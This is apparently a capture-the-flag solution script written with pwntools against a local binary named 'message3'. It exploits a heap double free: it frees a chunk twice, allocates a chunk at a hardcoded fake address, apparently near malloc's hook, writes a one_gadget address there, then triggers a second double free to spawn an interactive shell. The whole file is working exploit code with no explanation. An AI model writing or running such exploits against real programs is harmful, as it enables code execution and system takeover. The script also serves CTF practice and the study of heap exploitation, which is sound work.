from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./message3"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"
def opt(idx):
    p.sendlineafter(">>\n",str(idx))

def add(mes):
    opt(1)
    p.sendlineafter("input message: \n",str(mes))

def free(idx):
    opt(2)
    p.sendlineafter("input the index to delete\n",str(idx))


add("aaaa")
add("bbbb")
free(0)
free(1)
free(0)
fake_addr = 0x7ffff7dd1aed
one_gadget = 0x7ffff7afd364
add(p64(fake_addr))
add("aaaa")
add("aaaa")
add("b"*0x13 + p64(one_gadget))
free(0)
free(0)
p.interactive()
